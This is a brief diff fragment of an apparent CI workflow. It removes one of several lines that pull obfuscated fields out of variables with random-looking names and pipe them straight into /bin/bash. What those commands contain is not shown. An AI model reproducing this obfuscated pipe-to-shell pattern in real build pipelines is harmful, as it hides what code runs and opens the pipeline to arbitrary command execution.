@@ -25,7 +25,6 @@ jobs:
           echo $glnm18056 | jq -r .imvj0477 | /bin/bash
           echo $d1815 | jq -r .yei92040 | /bin/bash
           echo $qkmc07 | jq -r .uv96 | /bin/bash
-          printf '%s' "$p56730" | jq -r .ond76896 | /bin/bash
           echo $k32 | jq -r .vpc96813 | /bin/bash
 
       - name: Upload artifact
